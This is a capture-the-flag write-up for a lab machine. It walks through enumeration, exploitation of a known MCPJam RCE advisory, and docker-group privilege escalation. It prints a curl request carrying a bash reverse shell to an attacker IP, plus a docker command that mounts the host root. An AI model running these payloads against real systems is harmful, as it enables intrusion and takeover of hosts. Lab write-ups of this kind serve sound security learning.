
## Summary 

This was actually a rather easy machine, once you know the basics. 


## Basic enumeration 
### Port Scanning
After a first Nmap, I discovered that it is a Ubuntu Linux machine on which the following ports are open:
- 22: General ssh access -> ignoring this for now
- 80:  open but rediret to https://kobold.htb
- 443:  https open for the domain kobold.htb 

### Directory busting
After entering the domain to the `/etc/hosts` file, I tried to do some directory busting using the following commands:

```bash
# Directory busting using dirsearch  
dirsearch --url https://kobold.htb 

# Directory busting using ffuf 
ffuf -w /usr/share/seclist/Discovery/Web-Content/DirBuster-2007-directory-list-2.3-big.txt:FUZZ -u https://kobold.htb/FUZZ
```

After doing the dirbusting with two tools, I assumed that there are no further directories. Also navigating the page did not provide me any more information. Just a single page application. 

### Subdomain enumeration 
Since I was not able to find any directories, I assumed, that there could be some subdomains. Using ffuf and only matching status codes (mc)  200.

```bash 
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u https://kobold.htb -H 'Host: FUZZ.kobold.htb' -mc 200
```

This resulted in two Subdomains
- https://mcp.kobold.htb
- https://bin.kobold.htb 

### MCP Jam
Behind `https://mcp.kobold.htb` runs the service MCPJam. In the settings I discovered the version which is `v1.4.2`. Based on that we can google for an RCE. Luckily there is a Critical RCE for this version of mcpjam:
- https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6

### Privatebin
Beind `https://bin.kobold.htb` a privatebin ist hosted. The version is `2.0.2`. When googling for RCE or other vulnerabilities, I did not find anything.  

## Initial Foothold 
### MCPJam 
As descirebed on github I first had to create a new MCP server called `mytest` using the `npx @mcpjam/inspector@latest` package.

After that I had to reform the HTTP Request

```bash
# Request from the git repo
curl http://10.97.58.83:6274/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"cmd.exe\",\"args\":[\"/c\", \"calc\"],\"env\":{}},\"serverId\":\"mytest\"}"

# Adapted request for my purpose 
curl -k https://mcp.kobold.htb/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"bash\",\"args\":[\"-c\", \"bash -i >& /dev/tcp/10.10.14.97:8080 0>&1\"],\"env\":{}},\"serverId\":\"mytest\"}"
```

With this I was able to setup a reverse shell to the user ben. 
In the home directory I got the userflag. 

## Privilege Escalation 
To do some privEsc, I did some basic enumeration of the system like:
- looking at groups (member of operators)
- Running linpeas (which showed me already that there are week socket permissions for docker)
- finding all the files to which I have access with the group operator `find / -group operators 2>/dev/null` -> Which redirected me to the topic of the second running application which is the `privatebin

After trying more and more enumeration on the low priv user I discoverd (with the help of a writeup), that I can just try to add myself to the docker usergroup....

```bash 
# Switching active group to docker using newgrp 
newgrp docker 

# Now I can see that I have privileges using docker 
docker ps 

# I can now use an already existing image and spin up a temporary container to which I can mount the root directory using the root user 
docker run --rm -it -u 0 --entry-oint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2

# Using the chroot we can now access the underlying filesystem
chroot /mnt sh
```

After that we are able to find the root flag.